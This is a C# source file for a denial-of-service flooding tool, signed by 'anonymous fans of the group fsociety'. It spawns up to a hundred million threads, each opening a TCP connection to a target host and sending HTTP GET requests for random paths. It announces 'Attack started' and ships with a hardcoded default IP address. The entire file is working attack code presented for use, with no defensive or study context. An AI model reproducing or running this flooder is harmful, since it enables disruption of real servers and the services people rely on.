using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Collections.Generic;
using System.Linq;

class Program
{
    private static int threadNum = 0;
    private static readonly object threadNumMutex = new object();

    private static string host = "Minecraft";
    private static string ip = "185.237.204.213";
    private static int port = 21;
    private static int numRequests = 0;

    static void Main(string[] args)
    {
        if (args.Length == 1)
        {
            port = 80;
            numRequests = 100000000;
        }
        else if (args.Length == 2)
        {
            if (!int.TryParse(args[1], out port))
            {
                Environment.Exit(1);
            }
            numRequests = 100000000;
        }
        else if (args.Length == 3)
        {
            if (!int.TryParse(args[1], out port) || !int.TryParse(args[2], out numRequests))
            {
                Environment.Exit(1);
            }
        }
        else
        {
            Environment.Exit(1);
        }
        string rawHost = args[0];
        host = rawHost.Replace("https://", "") .Replace("http://", "").Replace("www.", "");

        try
        {
            IPAddress[] addresses = Dns.GetHostAddresses(host);
            ip = addresses[0].ToString();
        }
        catch
        {
            Environment.Exit(2);
        }

        Console.WriteLine($"[#] Attack started on {host} ({ip}) || Port: {port} || # Requests: {numRequests}");

        List<Thread> allThreads = new List<Thread>();

        for (int i = 0; i < numRequests; i++)
        {
            Thread t = new Thread(() => Attack(ip, port));
            t.Start();
            allThreads.Add(t);

            Thread.Sleep(10);
        }

        foreach (Thread t in allThreads)
        {
            t.Join();
        }
    }

    static void PrintStatus()
    {
        lock (threadNumMutex)
        {
            threadNum++;
            Console.Write($"\r {DateTime.Now.ToLongTimeString()} [{threadNum}] #-#-# Hold Your Tears #-#-#");
        }
    }

    static string GenerateUrlPath()
    {
        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?";
        Random rand = new Random(Guid.NewGuid().GetHashCode());
        return new string(Enumerable.Repeat(chars, 5)
                          .Select(s => s[rand.Next(s.Length)]).ToArray());
    }

    static void Attack(string ip, int port)
    {
        PrintStatus();
        string urlPath = GenerateUrlPath();

        try
        {
            using (TcpClient client = new TcpClient())
            {
                client.Connect(ip, port);
                using (NetworkStream stream = client.GetStream())
                {
                    string request = $"GET /{urlPath} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n";
                    byte[] data = Encoding.ASCII.GetBytes(request);
                    stream.Write(data, 0, data.Length);
                }
            }
        }
        catch
        {
            Console.WriteLine("\n ERROR");
        }
    }
}
//Created by a group of anonymous fans of the group fsociety :)
